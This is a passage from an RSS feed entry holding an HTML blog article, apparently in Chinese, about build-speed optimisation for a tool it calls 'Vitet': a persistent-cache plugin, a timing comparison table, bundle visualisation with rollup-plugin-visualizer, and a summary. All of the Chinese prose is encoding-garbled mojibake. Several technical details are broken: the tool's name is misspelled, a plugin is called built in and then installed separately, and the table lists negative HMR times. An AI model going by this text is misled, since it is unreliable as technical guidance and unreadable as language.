<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
   <span class="hljs-attr">plugins</span>:[<span class="hljs-title function_">persistentCache</span>()]
})
</code></pre>
<p>####æ•ˆæœå¯¹æ¯”:</p>

























<table><thead><tr><th>ç­–ç•¥</th><th>äºŒæ¬¡æ„å»ºæ—¶é—´</th><th>HMRæ›´æ–°æ—¶é—´</th></tr></thead><tbody><tr><td>æ— ç¼“å­˜</td><td>100%åŸºå‡†</td><td>500ms</td></tr><tr><td>å†…å­˜ç¼“å­˜</td><td>30%</td><td>-200ms</td></tr><tr><td>æŒä¹…åŒ–ç£ç›˜ç¼“å­˜</td><td>&lt;10%</td><td>-50ms</td></tr></tbody></table>
<hr/>
<p>###5.<strong>å¯è§†åŒ–åˆ†æä¸Bundleç›‘æ§</strong></p>
<p>æœ€åä½†åŒæ ·é‡è¦çš„æ˜¯ä¿æŒå¯¹äº§ç‰©ä½“ç§¯çš„ç›‘æ§.Vitetå†…ç½®äº†rollup-plugin-visualizeræ”¯æŒ:</p>
<p><em>å®‰è£…åˆ†æå·¥å…·</em></p>
<pre><code class="hljs language-bash" lang="bash">npm install rollup-plugin-visualizer -D
</code></pre>
<p><em>æ·»åŠ åˆ°Viteté…ç½®</em></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { visualizer }<span class="hljs-keyword">from</span> <span class="hljs-string">'rollup-plugin-visualizer'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
   <span class="hljs-attr">plugins</span>:[<span class="hljs-title function_">visualizer</span>()]
})
</code></pre>
<p>æ‰§è¡Œbuildåä¼šç”Ÿæˆstats.htmlæ–‡ä»¶,å±•ç¤º:
âœ…å„æ¨¡å—ä½“ç§¯å æ¯”
ğŸ“¦é‡å¤ä¾èµ–æ£€æµ‹
ğŸš€Tree-shakingæ•ˆæœ</p>
<p>å»ºè®®å°†æ­¤ä½œä¸ºCI/CDæµç¨‹çš„ä¸€éƒ¨åˆ†,è®¾ç½®ä½“ç§¯é˜ˆå€¼æŠ¥è­¦.</p>
<hr/>
<p>##æ€»ç»“</p>
<p>é€šè¿‡æœ¬æ–‡ä»‹ç»çš„äº”ä¸ªå…³é”®æŠ€å·§:</p>
<p>1ï¸âƒ£æ™ºèƒ½é¢„æ„å»ºåŠ é€Ÿä¾èµ–åŠ è½½<br/>
2ï¸âƒ£åŠ¨æ€å¯¼å…¥å®ç°ç²¾ç»†ä»£ç åˆ†å‰²<br/>
3ï¸âƒ£HTTP/2+ç°ä»£å‹ç¼©ç®—æ³•ä¼ è¾“ä¼˜åŒ–<br/>
4ï¸âƒ£å¤šçº§ç¼“å­˜ç­–ç•¥é™ä½é‡å¤å·¥ä½œ<br/>
5ï¸âƒ£æŒç»­ç›‘æ§ä¿è¯æœ€ä½³äº§ç‰©ä½“ç§¯</p>
<p>å¼€å‘è€…å¯ä»¥å……åˆ†é‡Šæ”¾Vitet3çš„æ€§èƒ½æ½œåŠ›.æ ¹æ®æˆ‘ä»¬çš„åŸºå‡†æµ‹è¯•,ç»¼åˆåº”ç”¨è¿™äº›æ–¹æ³•å¯ä½¿æ•´ä½“å¼€å‘æ•ˆç‡æå‡50%~70%,ç‰¹åˆ«æ˜¯åœ¨çƒ­æ›´æ–°é€Ÿåº¦å’Œæ„å»ºæ—¶é—´ä¸Šè¡¨ç°å°¤ä¸ºçªå‡º.</p>
<p>å½“ç„¶,æœ€ä½³å®è·µéœ€è¦æ ¹æ®é¡¹ç›®ç‰¹ç‚¹è°ƒæ•´.Vitetçš„å¼ºå¤§ä¹‹å¤„åœ¨äºå®ƒçš„çµæ´»æ€§â€”â€”æ— è®ºæ˜¯å°å‹SPAè¿˜æ˜¯å¤æ‚Monorepo,æ€»èƒ½æ‰¾åˆ°é€‚åˆä½ çš„åŠ é€Ÿæ–¹æ¡ˆ.</p>
<p>æ­£å¦‚Evan Youæ‰€è¯´:"The best build tool is the one you forget you're using."å½“ä½ ä¸å†è¢«å·¥å…·æ‰€å›°æ‰°æ—¶,æ‰æ˜¯çœŸæ­£çš„ç”Ÿäº§åŠ›è§£æ”¾æ—¶åˆ»!</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>